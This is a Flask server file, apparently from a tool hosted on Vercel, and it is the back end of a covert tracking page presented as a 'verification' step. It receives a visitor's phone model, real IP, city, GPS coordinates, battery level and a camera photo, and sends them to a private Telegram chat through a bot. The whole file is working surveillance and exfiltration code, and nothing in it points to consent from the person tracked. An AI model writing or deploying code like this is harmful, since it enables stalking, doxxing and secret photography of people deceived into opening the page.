import os
import base64
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__, template_folder='../templates')

# --- CONFIG (Lock values in Vercel Dashboard) ---
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

def send_to_telegram(report_text, photo_bytes=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
        requests.post(url + "sendMessage", data={
            "chat_id": CHAT_ID, 
            "text": report_text, 
            "parse_mode": "HTML"
        })
        if photo_bytes:
            files = {'photo': ('capture.jpg', photo_bytes, 'image/jpeg')}
            requests.post(url + "sendPhoto", data={"chat_id": CHAT_ID}, files=files)
    except Exception as e:
        print(f"Error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        info = data.get('info', {})
        photo_raw = data.get('photo')
        
        map_url = f"http://google.com/maps?q={info.get('lat')},{info.get('lon')}"
        
        report = (
            f"📥 <b>Verification Received</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📱 <b>Model:</b> <code>{info.get('model')}</code>\n"
            f"🌍 <b>Location:</b> {info.get('city')}, {info.get('country')}\n"
            f"🌐 <b>Real IP:</b> <code>{info.get('realIp')}</code>\n"
            f"🔋 <b>Battery:</b> {info.get('battery')}\n"
            f"⏰ <b>Time:</b> {info.get('time')}\n"
            f"📍 <b>Maps:</b> <a href='{map_url}'>Click for Location</a>\n"
            f"━━━━━━━━━━━━━━━━━━"
        )

        if photo_raw:
            photo_bytes = base64.b64decode(photo_raw.split(",")[1])
            send_to_telegram(report, photo_bytes)
        else:
            send_to_telegram(report)

        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error"}), 500
        
